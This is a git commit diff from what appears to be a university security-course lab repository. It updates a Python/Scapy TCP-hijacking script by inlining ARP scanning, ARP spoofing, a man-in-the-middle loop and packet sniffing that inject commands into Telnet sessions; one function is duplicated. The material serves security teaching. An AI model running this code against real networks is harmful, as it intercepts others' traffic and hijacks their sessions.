f0d67b26b70480fc67b0f35207271ef47059df09
Jin Hong <jin.hong@uwa.edu.au>
2023-07-24 21:38:50 +0800

    updated tcp hijacking

--- cits3006-labs/files/tcp_hijacking.py
+++ cits3006-labs/files/tcp_hijacking.py
@@ -1,8 +1,14 @@
 from scapy.all import *
+from sys import exit, stdout
+from threading import Thread
 import argparse
 import sys
-import arp_poisoning
+import time
+import platform
 import globals
+import logging
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
 def forge_response(p, proto):
@@ -54,6 +60,151 @@ def forge_response(p, proto):
         response = ""
 
     return response
+
+
+def set_ip_forwarding(enable):
+    """
+    Enables IP forwarding through system commands depending on the OS
+
+    Args:
+        enable (bool): True if enable, False otherwise.
+    """
+    enable = int(enable)
+    platform_name = platform.system()
+
+    if platform_name == "Linux":
+        # Linux
+        os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(enable))
+
+    elif platform_name == "Darwin":
+        # OSX
+        os.system('sysctl -w net.inet.ip.forwarding={}'.format(enable))
+    # elif platform_name == "Windows":
+
+
+def arp_scan(ip, interface):
+    """
+    Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
+    Args:
+        ip (str): An IP address or IP address range to scan. For example:
+                    - 192.168.1.1 to scan a single IP address
+                    - 192.168.1.1/24 to scan a range of IP addresses.
+    Returns:
+        A list of dictionaries mapping IP addresses to MAC addresses. For example:
+        [
+            {'IP': '192.168.2.1', 'MAC': 'c4:93:d9:8b:3e:5a'}
+        ]
+    """
+    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+
+    ans, unans = srp(request, timeout=2, retry=1, verbose=0, iface=interface)
+    result = []
+
+    for sent, received in ans:
+        result.append({'IP': received.psrc, 'MAC': received.hwsrc})
+
+    return result
+
+def sniffer_thread(callback, filter, iface):
+    while not globals.STOP_SNIFF:
+        sniff(
+            prn=callback,
+            filter=filter,
+            count=2,
+            iface=iface
+        )
+
+def arp_spoof(targetIP, spoofIP, spoofMAC):
+    """
+    Performs an ARP spoofing attack against the target IP.
+    Args:
+        targetIP (str): An IP address to target.
+        spoofIP (str): An IP address to spoof as.
+        spoofMAC (str): The spoofed MAC address.
+    """
+    packet = ARP(op=2, pdst=targetIP, psrc=spoofIP, hwsrc=spoofMAC)
+    send(packet, verbose=False)
+
+
+def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
+    """
+    Restores the ARP cache after an ARP spoofing attack.
+
+    Args:
+        destinationIP (str): The target IP address.
+        sourceIP (str): The IP address of the original host to be restored.
+        destinationMAC (str): The target MAC address.
+        sourceMAC (str): The MAC address of the original host to be restored.
+    """
+    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
+    send(packet, count=4, verbose=False)
+
+
+def set_ip_forwarding(enable):
+    """
+    Enables IP forwarding through system commands depending on the OS
+
+    Args:
+        enable (bool): True if enable, False otherwise.
+    """
+    enable = int(enable)
+    platform_name = platform.system()
+
+    if platform_name == "Linux":
+        # Linux
+        os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(enable))
+
+    elif platform_name == "Darwin":
+        # OSX
+        os.system('sysctl -w net.inet.ip.forwarding={}'.format(enable))
+    # elif platform_name == "Windows":
+
+
+def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter, iface):
+
+    packets = 0
+
+    # Start packet forwarding thread
+    print("[+] Packet forwarding enabled.")
+    set_ip_forwarding(1)
+
+    print("[+] Starting Packet Sniff.")
+
+    sniffer = Thread(target=sniffer_thread, args=(callback, filter, iface))
+    sniffer.start()
+
+    time.sleep(5)
+
+    # Begin ARP MITM attack
+    print("[+] ARP MITM attack started.")
+    try:
+        while True:
+
+            # Tell victim machine that I am the router.
+            arp_spoof(targetIP, gatewayIP, myMAC)
+
+            # Tell router that I am the victim machine.
+            arp_spoof(gatewayIP, targetIP, myMAC)
+
+            packets += 2
+            if packets % 10 == 0:
+                print("\r[+] Sent packets " + str(packets)),
+            stdout.flush()
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print("[+] Interrupt detected, restoring to original state.")
+
+        # Restore ARP cache
+        arp_restore(targetIP, gatewayIP, targetMAC, gatewayMAC)
+        arp_restore(gatewayIP, targetIP, gatewayMAC, targetMAC)
+
+        print("[+] Packet forwarding disabled.")
+        set_ip_forwarding(0)
+
+        print("[+] Stopping Packet Sniff.")
+        globals.STOP_SNIFF = True
+        sniffer.join()
 
 
 def hijack(p):
@@ -117,14 +268,14 @@ def main():
 
     print(f"[+] Determining target and gateway MAC address.")
 
-    result = arp_poisoning.arp_scan(args.target, args.interface)
+    result = arp_scan(args.target, args.interface)
     if not result:
         print("\tCannot determine target MAC address. Are you sure the IP is correct?")
         sys.exit(1)
     else:
         targetMAC = result[0]['MAC']
 
-    result = arp_poisoning.arp_scan(args.gateway, args.interface)
+    result = arp_scan(args.gateway, args.interface)
     if not result:
         print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
         sys.exit(1)
@@ -149,7 +300,7 @@ def main():
         globals.CMD = args.cmd
         filter = f"ip and tcp port 23 and ether src {gatewayMAC}"
 
-    arp_poisoning.arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, args.interface)
+    arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, args.interface)
 
 
 if __name__ == '__main__':
